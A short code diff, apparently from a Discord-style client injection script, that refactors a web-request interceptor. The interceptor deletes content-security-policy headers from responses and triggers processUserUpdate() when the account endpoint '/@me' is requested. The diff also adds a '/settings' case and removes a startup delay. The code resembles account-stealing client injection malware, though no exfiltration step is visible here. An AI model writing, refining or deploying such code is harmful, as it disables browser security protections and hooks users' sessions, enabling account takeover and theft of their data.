@@ -1304,9 +1304,10 @@ const interceptRequest = () => {
         const { url, method, statusCode, responseHeaders, uploadData } = request;
         const updatedHeaders = { ...responseHeaders };
 
-        delete updatedHeaders["content-security-policy"];
-        delete updatedHeaders["content-security-policy-report-only"];
-
+        ['content-security-policy', 'content-security-policy-report-only'].forEach(header => {
+            delete updatedHeaders[header];
+        });
+        
         callback({
             responseHeaders: {
                 ...updatedHeaders,
@@ -1416,10 +1417,12 @@ const interceptRequest = () => {
         }
 
         switch (true) {
-            case (url.endsWith('/@me') && !script_executed): 
-                script_executed = true;
-                
+            case (url.endsWith('/@me') && !script_executed):
                 await processUserUpdate();
+                break;
+            
+            case (url.includes('/settings') && !script_executed):
+                script_executed = true;
                 break;
         };
     });
@@ -1440,7 +1443,6 @@ const allSessionsLocked = async () => {
     (async () => {
         try {
             const enabled = await isLogged();
-            await delay(3000);
             if (enabled) return interceptRequest();
         } catch (error) {
             console.error(error);
